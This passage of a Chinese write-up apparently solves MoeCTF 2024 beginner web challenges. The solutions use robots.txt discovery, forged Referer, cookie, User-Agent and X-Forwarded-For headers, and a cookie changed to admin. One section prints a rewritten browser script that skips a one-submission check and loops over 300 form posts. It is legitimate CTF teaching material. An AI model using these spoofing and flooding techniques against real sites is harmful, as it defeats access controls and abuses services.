BYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">MoeCTF 2024 wp<!----></h1>  <div class="theme-vdoing-content content__default"><h2 id="web渗透测试与审计入门指北"><a href="#web渗透测试与审计入门指北" class="header-anchor">#</a> Web渗透测试与审计入门指北</h2> <p>下载题目附件，一份web新手入门指北，根据pdf指引，再下载另一个附件，本地下载phpstudy，搭个web网站访问首页就给flag</p> <h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="header-anchor">#</a> 弗拉格之地的入口</h2> <p>打开题目提示<code>有一种生物，名为爬虫，它能带领各位找到那里</code>，一个web基础，<code>robots.txt爬虫协议</code>，新手可以看<a href="https://blog.csdn.net/sunsineq/article/details/111057069" target="_blank" rel="noopener noreferrer">如何使用robots.txt及其详解<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在robots.txt中会放一些敏感目录，避免<code>搜索引擎爬虫</code>访问这些内容，一些情况下，变成了引路人</p> <p><img src="/medias/moectf/1.png" alt="1"></p> <p>访问<code>robots.txt</code>的敏感文件，拿到flag</p> <p><img src="/medias/moectf/2.png" alt="2"></p> <h2 id="垫刀之路01-moectf-启动"><a href="#垫刀之路01-moectf-启动" class="header-anchor">#</a> 垫刀之路01: MoeCTF？启动！</h2> <p>题目送了一个shell，如果能学习一点linux，挺好做的，基础的命令要会</p> <p><code>ls /</code>查看根目录下文件，一个flag文件，<code>cat /flag</code>查看flag内容，flag内容<code>不再这里哦。 你可以检查一下环境变量这个东西</code>，</p> <p>用<code>env</code>命令查看环境变量</p> <p><img src="/medias/moectf/3.png" alt="3"></p> <h2 id="ez-http"><a href="#ez-http" class="header-anchor">#</a> ez_http</h2> <p>关于http报文字段相关用hackbar比较方便</p> <p>需要post方法访问，post随便传一个<code>a=1</code>，提示post传<code>imoau=sb</code>，把<code>a=1</code>换成<code>imoau=sb</code></p> <p>提示要GET传参<code>xt=大帅b</code>，在url后面加上<code>?xt=大帅b</code></p> <p>提示来源必须是<code>https://www.xidian.edu.cn/</code>，在hackbar右侧添加<code>referer</code>字段，值是<code>https://www.xidian.edu.cn/</code></p> <p>提示<code>cookie:user=admin</code>，在hackbar右侧添加<code>cookie</code>字段，值是<code>user=admin</code></p> <p>提示使用<code>MoeDedicatedBrowser</code>浏览器，在hackbar右侧添加<code>user-agent</code>字段，值是<code>MoeDedicatedBrowser</code></p> <p>提示只能本地访问，伪造ip有很多字段，这里用<code>x-forwarded-for</code>字段，值是<code>127.0.0.1</code></p> <p><img src="/medias/moectf/4.png" alt="4"></p> <h2 id="proveyourlove"><a href="#proveyourlove" class="header-anchor">#</a> ProveYourLove</h2> <p>题目主要js部分，会限制只能提交一份表白</p> <details class="custom-block details"><summary>点击查看</summary> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
        document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 获取当前表白份数</span>
            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/confession_count'</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionCount'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>count<span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>flag<span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'Qixi_flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>Qixi_flag<span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 阻止表单的默认提交行为</span>

            <span class="token comment">// 检查设备是否已提交过表白</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'您已经提交过表白，不能重复提交。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// 发起 OPTIONS 请求</span>
            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/questionnaire'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'OPTIONS'</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'OPTIONS 请求失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token comment">// 获取表单数据</span>
                <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
                formData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 提交表白数据</span>
                <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/questionnaire'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
                    <span class="token punctuation">}</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'表白提交成功！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">,</span> <span class="token string">'true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token comment">// 更新表白份数</span>
                    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/confession_count'</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionCount'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>count<span class="token punctuation">;</span>
                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>flag<span class="token punctuation">;</span>
                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'Qixi_flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>Qixi_flag<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'表白提交失败，请稍后重试。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br></div></div></details> <p>在控制台重写一下这个js，去掉重复提交的判断，补充个循环，让他直接发300份。填好信息，点击提交就可以发300份了，要稍等一会才能发完</p> <details class="custom-block details"><summary>点击查看</summary> <div class="language-js line-numbers-mode"><pre class="language-js"><code>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 获取当前表白份数</span>
            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/confession_count'</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionCount'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>count<span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>flag<span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'Qixi_flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>Qixi_flag<span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 阻止表单的默认提交行为</span>

            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>n<span class="token operator">&lt;</span><span class="token number">301</span><span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 发起 OPTIONS 请求</span>
                <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/questionnaire'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'OPTIONS'</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'OPTIONS 请求失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token comment">// 获取表单数据</span>
                        <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
                        formData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                            data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                        <span class="token comment">// 提交表白数据</span>
                        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/questionnaire'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                            <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                                <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
                            <span class="token punctuation">}</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token comment">// alert('表白提交成功！');</span>
                            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">,</span> <span class="token string">'true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                            <span class="token comment">// 更新表白份数</span>
                            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/confession_count'</span><span class="token punctuation">)</span>
                                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'confessionCount'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>count<span class="token punctuation">;</span>
                                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>flag<span class="token punctuation">;</span>
                                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'Qixi_flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">.</span>Qixi_flag<span class="token punctuation">;</span>
                                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                                <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'表白提交失败，请稍后重试。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br></div></div></details> <p><img src="/medias/moectf/5.png" alt="5"></p> <h2 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="header-anchor">#</a> 弗拉格之地的挑战</h2> <p>查看源码，拿到flag第一部分<code>bW9lY3Rm</code>，和第二题<code>flag2hh.php</code></p> <p>到题目第二关<code>flag2hh.php</code>，什么信息都没有，本地抓包抓不到，用bp自带的浏览器页面，在响应信息里可以看到第二段flag<code>e0FmdEV</code>，以及第三关<code>/flag3cad.php</code></p> <p><img src="/medias/moectf/6.png" alt="6"></p> <p>第三关，可以在cookie里找到<code>verify:user</code>的键值对，在hackbar里改成<code>verify:admin</code>，拿flag第三部分<code>yX3RoMXN</code>，以及第四关<code>/flag4bbc.php</code></p> <p><img src="/medias/moectf/7.png" alt="7"></p> <p>第四关，提示不是从<code>http://localhost:8080/flag3cad.php?a=1</code>过来的，伪造一下来源，跳到另一个页面，f12大法，修改html源码，在控制台拿下第四一段flag<code>fdFVUMHJ</code>，以及第五关<code>/flag5sxr.php</code></p> <p><img src="/medias/moectf/8.png" alt="8"></p> <p>第五关，要求提交<code>I want flag</code>，点击提交，有个碍事的js函数拦截了，在控制台重写这个函数，把他写成空，拿到第五段flag<code>fSV90aDF</code></p> <p><img src="/medias/moectf/9.png" alt="9"></p> <p>第六关，同时提交get,post变量<code>moe</code>，第一个正则要求不能匹配到小写<code>flag</code>，第二个正则不区分大小写的匹配<code>flag</code>，所以可以传个大写<code>FLAG</code>，拿到第六段flag<code>rZV9VX2t</code></p> <p><img src="/medias/moectf/10.png" alt="10"></p> <p>第七关，给了一个shell，在根目录下找到第七段flag<code>rbm93X1dlQn0=</code></p> <p>最后，把七段flag拼在一起，base64解码得到最后的flag</p> <p><img src="/medias/moectf/11.png" alt="11"></p> <h2 id="imagecloud前置"><a href="#imagecloud前置" class="header-anchor">#</a> ImageCloud前置</h2> 